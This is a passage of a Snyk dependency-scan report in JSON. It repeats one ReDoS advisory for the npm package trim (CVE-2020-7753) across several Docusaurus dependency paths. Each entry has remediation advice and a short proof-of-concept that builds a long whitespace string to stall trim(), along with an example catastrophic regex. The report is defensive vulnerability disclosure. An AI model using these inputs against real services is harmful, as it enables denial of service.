      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-classic@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-pages@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        false,
        false,
        "remark-parse@9.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-search-algolia@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-pages@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        false,
        false,
        "remark-parse@9.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-blog@2.2.0",
        "@docusaurus/core@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        false,
        "@mdx-js/mdx@2.0.0",
        "remark-mdx@2.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-classic@2.2.0",
        "@docusaurus/plugin-content-blog@2.2.0",
        "@docusaurus/core@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        false,
        "@mdx-js/mdx@2.0.0",
        "remark-mdx@2.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-docs@2.2.0",
        "@docusaurus/core@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        false,
        "@mdx-js/mdx@2.0.0",
        "remark-mdx@2.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first 